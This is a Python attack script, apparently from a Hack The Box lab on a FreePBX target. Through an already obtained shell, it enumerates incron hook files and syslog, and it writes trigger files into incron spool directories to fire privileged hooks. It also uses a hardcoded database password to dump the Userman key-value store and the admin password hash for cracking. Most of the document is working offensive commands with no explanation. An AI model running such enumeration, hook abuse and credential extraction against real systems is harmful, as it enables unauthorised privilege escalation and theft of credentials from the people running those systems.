#!/usr/bin/env python3
import sys
sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell

cmd, url = get_shell()
print("shell", url)
for title, c in [
    ("incron files", "cat /etc/incron.d/legacy; echo ---; cat /etc/incron.d/local; echo ---; cat /etc/incron.d/sysadmin"),
    ("syslog hook", "tail -80 /var/log/syslog 2>/dev/null | grep -i hook; tail -40 /var/log/messages 2>/dev/null | grep -i sysadmin"),
    ("local incron trigger", "echo x > /usr/local/asterisk/incron/test.hook.CONTENTS 2>&1; sleep 3; ls -la /usr/local/asterisk/incron/"),
    ("trigger2", "echo x > /var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; sleep 4; stat /tmp/iptables-save-output 2>&1"),
    ("kvstore", "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e \"SHOW TABLES LIKE '%kv%'; SELECT id,\\`key\\`,val FROM kvstore_FreePBX_modules_Userman LIMIT 8\" 2>&1"),
    ("admin crack hint", "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e \"SELECT username,password FROM admin WHERE username='admin'\" 2>&1"),
]:
    print("\n##", title)
    print(cmd(c, timeout=120)[:5000])